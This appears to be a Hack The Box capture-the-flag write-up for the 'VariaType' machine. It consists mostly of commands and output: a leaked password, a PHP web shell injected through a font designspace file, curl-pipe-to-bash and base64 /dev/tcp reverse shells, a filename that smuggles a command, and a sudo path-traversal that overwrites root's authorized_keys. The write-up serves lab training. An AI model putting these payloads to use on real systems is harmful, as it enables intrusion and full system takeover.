---
tags:
title: VariaType - Medium (HTB)
permalink: /VariaType-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash 
zs1n@ptw ~> nmapf 10.129.10.178 -Pn
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-16 13:40 -0400
Initiating Parallel DNS resolution of 1 host. at 13:40
Completed Parallel DNS resolution of 1 host. at 13:40, 0.50s elapsed
Initiating SYN Stealth Scan at 13:40
Scanning 10.129.10.178 [65535 ports]
Discovered open port 80/tcp on 10.129.10.178
Discovered open port 22/tcp on 10.129.10.178
Discovered open port 22/tcp on 10.129.10.178
Discovered open port 80/tcp on 10.129.10.178
Completed SYN Stealth Scan at 13:41, 17.52s elapsed (65535 total ports)
Nmap scan report for 10.129.10.178
Host is up, received user-set (0.30s latency).
Scanned at 2026-03-16 13:40:45 EDT for 18s
Not shown: 58697 closed tcp ports (reset), 6836 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 18.12 seconds
           Raw packets sent: 161044 (7.086MB) | Rcvd: 96847 (3.874MB)
-e [*] IP: 10.129.10.178
[*] Puertos abiertos: 22,80
/usr/bin/xclip
-e [*] Service scanning with nmap against 22,80 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-16 13:41 -0400
Nmap scan report for variatype.htb (10.129.10.178)
Host is up (0.34s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 e0:b2:eb:88:e3:6a:dd:4c:db:c1:38:65:46:b5:3a:1e (ECDSA)
|_  256 ee:d2:bb:81:4d:a2:8f:df:1c:50:bc:e1:0e:0a:d1:22 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: VariaType Labs \xE2\x80\x94 Variable Font Generator
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.19 seconds
```

![[Pasted image 20260316144123.png]]
https://robofont.com/documentation/tutorials/creating-designspace-files/

![[Pasted image 20260316150124.png]]

![[Pasted image 20260316155438.png]]

```bash
python3 git_dumper.py http://portal.variatype.htb git  
```

```bash
zs1n@ptw ~> git show 753b5f5957f2020480a19bf29a0ebc80267a4a3d
commit 753b5f5957f2020480a19bf29a0ebc80267a4a3d (HEAD -> master)
Author: Dev Team <dev@variatype.htb>
Date:   Fri Dec 5 15:59:33 2025 -0500

    fix: add gitbot user for automated validation pipeline

diff --git a/auth.php b/auth.php
index 615e621..b328305 100644
--- a/auth.php
+++ b/auth.php
@@ -1,3 +1,5 @@
 <?php
 session_start();
-$USERS = [];
+$USERS = [
+    'gitbot' => 'G1tB0t_Acc3ss_2025!'
+];
```

![[Pasted image 20260316163552.png]]

![[Pasted image 20260316170648.png]]

```bash
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
	<axes>
        <!-- XML injection occurs in labelname elements with CDATA sections -->
	    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
	        <labelname xml:lang="en"><![CDATA[<?php system($_GET['cmd']);?>]]]]><![CDATA[>]]></labelname>
	        <labelname xml:lang="fr">MEOW2</labelname>
	    </axis>
	</axes>
	<axis tag="wght" name="Weight" minimum="100" maximum="900" default="400"/>
	<sources>
		<source filename="source-light.ttf" name="Light">
			<location>
				<dimension name="Weight" xvalue="100"/>
			</location>
		</source>
		<source filename="source-regular.ttf" name="Regular">
			<location>
				<dimension name="Weight" xvalue="400"/>
			</location>
		</source>
	</sources>
	<variable-fonts>
		<variable-font name="MyFont" filename="../../../../../var/www/portal.variatype.htb/public/files/rev.php">
			<axis-subsets>
				<axis-subset name="Weight"/>
			</axis-subsets>
		</variable-font>
	</variable-fonts>
	<instances>
		<instance name="Display Thin" familyname="MyFont" stylename="Thin">
			<location><dimension name="Weight" xvalue="100"/></location>
			<labelname xml:lang="en">Display Thin</labelname>
		</instance>
	</instances>
</designspace>
```

![[Pasted image 20260316171215.png]]


```bash
zs1n@ptw ~> curl -s 'http://portal.variatype.htb/files/rev.php?cmd=curl%2010.10.16.171%20|bash'
```

```bash
zs1n@ptw ~> sudo nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.16.171] from (UNKNOWN) [10.129.10.178] 45842
/bin/sh: 0: can't access tty; job control turned off
$
```

```bash
www-data@variatype:/opt$ cat process_client_submissions.bak
#!/bin/bash
#
# Variatype Font Processing Pipeline
# Author: Steve Rodriguez <steve@variatype.htb>
# Only accepts filenames with letters, digits, dots, hyphens, and underscores.
#

set -euo pipefail

UPLOAD_DIR="/var/www/portal.variatype.htb/public/files"
PROCESSED_DIR="/home/steve/processed_fonts"
QUARANTINE_DIR="/home/steve/quarantine"
LOG_FILE="/home/steve/logs/font_pipeline.log"

mkdir -p "$PROCESSED_DIR" "$QUARANTINE_DIR" "$(dirname "$LOG_FILE")"

log() {
    echo "[$(date --iso-8601=seconds)] $*" >> "$LOG_FILE"
}

cd "$UPLOAD_DIR" || { log "ERROR: Failed to enter upload directory"; exit 1; }

shopt -s nullglob

EXTENSIONS=(
    "*.ttf" "*.otf" "*.woff" "*.woff2"
    "*.zip" "*.tar" "*.tar.gz"
    "*.sfd"
)

SAFE_NAME_REGEX='^[a-zA-Z0-9._-]+$'

found_any=0
for ext in "${EXTENSIONS[@]}"; do
    for file in $ext; do
        found_any=1
        [[ -f "$file" ]] || continue
        [[ -s "$file" ]] || { log "SKIP (empty): $file"; continue; }

        # Enforce strict naming policy
        if [[ ! "$file" =~ $SAFE_NAME_REGEX ]]; then
            log "QUARANTINE: Filename contains invalid characters: $file"
            mv "$file" "$QUARANTINE_DIR/" 2>/dev/null || true
            continue
        fi

        log "Processing submission: $file"

        if timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c "
import fontforge
import sys
try:
    font = fontforge.open('$file')
    family = getattr(font, 'familyname', 'Unknown')
    style = getattr(font, 'fontname', 'Default')
    print(f'INFO: Loaded {family} ({style})', file=sys.stderr)
    font.close()
except Exception as e:
    print(f'ERROR: Failed to process $file: {e}', file=sys.stderr)
    sys.exit(1)
"; then
            log "SUCCESS: Validated $file"
        else
            log "WARNING: FontForge reported issues with $file"
        fi

        mv "$file" "$PROCESSED_DIR/" 2>/dev/null || log "WARNING: Could not move $file"
    done
done

if [[ $found_any -eq 0 ]]; then
    log "No eligible submissions found."
fi
```

```bash
www-data@variatype:~/portal.variatype.htb/public/files$ python3 exploit.py
exploit.zip wurde erstellt!
```

```bash
import zipfile

payload = "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNzEvNDQ0NCAwPiYxCg=="

exploit_filename = f"$(echo {payload}|base64 -d|bash).ttf"

with zipfile.ZipFile('exploit.zip', 'w') as zipf:
    zipf.writestr(exploit_filename, "dummy content")

print("exploit.zip wurde erstellt!")
```


```bash
zs1n@ptw ~> sudo nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.16.171] from (UNKNOWN) [10.129.10.178] 46952
bash: cannot set terminal process group (5918): Inappropriate ioctl for device
bash: no job control in this shell
steve@variatype:/tmp/ffarchive-5919-1$ cd /home
cd /home
```

```bash
steve@variatype:~$ cat user.txt
b6018adda64d73b3ff601b68d84d1a3f
```

```bash
b6018adda64d73b3ff601b68d84d1a3f
steve@variatype:~$ sudo -l
Matching Defaults entries for steve on variatype:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User steve may run the following commands on variatype:
    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
steve@variatype:~$ cat /opt/font-tools/install_validator.py
#!/usr/bin/env python3
"""
Font Validator Plugin Installer
--------------------------------
Allows typography operators to install validation plugins
developed by external designers. These plugins must be simple
Python modules containing a validate_font() function.

Example usage:
  sudo /opt/font-tools/install_validator.py https://designer.example.com/plugins/woff2-check.py
"""

import os
import sys
import re
import logging
from urllib.parse import urlparse
from setuptools.package_index import PackageIndex

# Configuration
PLUGIN_DIR = "/opt/font-tools/validators"
LOG_FILE = "/var/log/font-validator-install.log"

# Set up logging
os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme in ('http', 'https'), result.netloc])
    except Exception:
        return False

def install_validator_plugin(plugin_url):
    if not os.path.exists(PLUGIN_DIR):
        os.makedirs(PLUGIN_DIR, mode=0o755)

    logging.info(f"Attempting to install plugin from: {plugin_url}")

    index = PackageIndex()
    try:
        downloaded_path = index.download(plugin_url, PLUGIN_DIR)
        logging.info(f"Plugin installed at: {downloaded_path}")
        print("[+] Plugin installed successfully.")
    except Exception as e:
        logging.error(f"Failed to install plugin: {e}")
        print(f"[-] Error: {e}")
        sys.exit(1)

def main():
    if len(sys.argv) != 2:
        print("Usage: sudo /opt/font-tools/install_validator.py <PLUGIN_URL>")
        print("Example: sudo /opt/font-tools/install_validator.py https://internal.example.com/plugins/glyph-check.py")
        sys.exit(1)

    plugin_url = sys.argv[1]

    if not is_valid_url(plugin_url):
        print("[-] Invalid URL. Must start with http:// or https://")
        sys.exit(1)

    if plugin_url.count('/') > 10:
        print("[-] Suspiciously long URL. Aborting.")
        sys.exit(1)

    install_validator_plugin(plugin_url)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] This script must be run as root (use sudo).")
        sys.exit(1)
    main()
```

```bash
cat << EOF > setup.py
from setuptools import setup
import os
os.system("cp /bin/bash /tmp/root_bash && chmod +s /tmp/root_bash")
setup(name="exploit", version="1.0")
EOF

# Comprímelo en un formato que PackageIndex reconozca
tar -czvf exploit.tar.gz setup.py
```

```bash
steve@variatype:~$ sudo /usr/bin/python3 /opt/font-tools/install_validator.py "http://10.10.16.171/exploit.tar.gz"
2026-03-16 16:36:02,638 [INFO] Attempting to install plugin from: http://10.10.16.171/exploit.tar.gz
2026-03-16 16:36:02,650 [INFO] Downloading http://10.10.16.171/exploit.tar.gz
2026-03-16 16:36:06,162 [INFO] Plugin installed at: /opt/font-tools/validators/exploit.tar.gz
[+] Plugin installed successfully.
```

```bash
zs1n@ptw ~> cat server.py
from http.server import HTTPServer, BaseHTTPRequestHandler
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        with open('authorized_keys', 'rb') as f:
            data = f.read()
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.send_header('Content-Length', len(data))
        self.end_headers()
        self.wfile.write(data)
HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
```

```bash
zs1n@ptw ~> echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFrl3lUceDWKm4BMhFXeAxeKRT8CaeTV6U+HtGpwSJfI root@kali" > authorized_keys
```

```bash
steve@variatype:/tmp/serve$ sudo /usr/bin/python3 /opt/font-tools/install_validator.py "http://10.10.16.171:8888/%2Froot%2F.ssh%2Fauthorized_keys"
2026-03-16 16:42:20,748 [INFO] Attempting to install plugin from: http://10.10.16.171:8888/%2Froot%2F.ssh%2Fauthorized_keys
2026-03-16 16:42:20,759 [INFO] Downloading http://10.10.16.171:8888/%2Froot%2F.ssh%2Fauthorized_keys
2026-03-16 16:42:22,511 [INFO] Plugin installed at: /root/.ssh/authorized_keys
[+] Plugin installed successfully.
```

```bash
└─# ssh root@variatype.htb -i /root/.ssh/id_ed25519
The authenticity of host 'variatype.htb (10.129.10.178)' can't be established.
ED25519 key fingerprint is: SHA256:0Wqe+nNeYlUwY+F669ywmS9kPUMYXqJh5xxCxwyCapI
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'variatype.htb' (ED25519) to the list of known hosts.
Linux variatype 6.1.0-43-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 (2026-02-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Mar 16 16:43:08 2026 from 10.10.16.171
root@variatype:~# cat root.txt
4f81cbbe675693aef427f849a20e298f
```